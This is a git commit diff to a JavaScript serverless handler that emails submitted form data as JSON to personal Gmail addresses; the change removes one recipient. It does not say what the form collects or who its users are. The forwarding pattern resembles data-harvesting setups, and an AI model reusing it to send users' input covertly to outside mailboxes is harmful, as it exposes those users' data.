0603e0308334d9e79dc53974848e7632b931bd09
tufailacjsm37-design <tufailacjsm37@gmail.com>
2026-02-20 21:46:34 +0500

    Update tufaill.js

--- tufaill.js
+++ tufaill.js
@@ -37,7 +37,7 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "ta0134750@gmail.com,alizajack00@gmail.com",
+      to: "ta0134750@gmail.com",
       subject: "tufaill",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
